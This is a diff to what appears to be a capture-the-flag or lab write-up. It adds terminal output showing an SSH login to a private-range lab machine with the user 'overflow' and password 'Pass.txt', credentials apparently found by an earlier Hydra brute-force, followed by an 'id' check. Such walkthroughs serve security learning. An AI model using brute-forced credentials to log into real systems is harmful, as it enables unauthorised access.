@@ -175,6 +175,35 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-17 07:29:
 
 yes the user `overflow` has the password `Pass.txt` so we can login to SSH with these credentials.
 
+```bash
+root@kali: ssh overflow@192.168.127.141
+
+overflow@192.168.127.141's password: 
+Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic i686)
+
+ * Documentation:  https://help.ubuntu.com/
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Sun Sep 17 04:31:12 2023 from 192.168.127.128
+Could not chdir to home directory /home/overflow: No such file or directory
+$ id
+uid=1002(overflow) gid=1002(overflow) groups=1002(overflow)
+$ 
+```
 
 
 
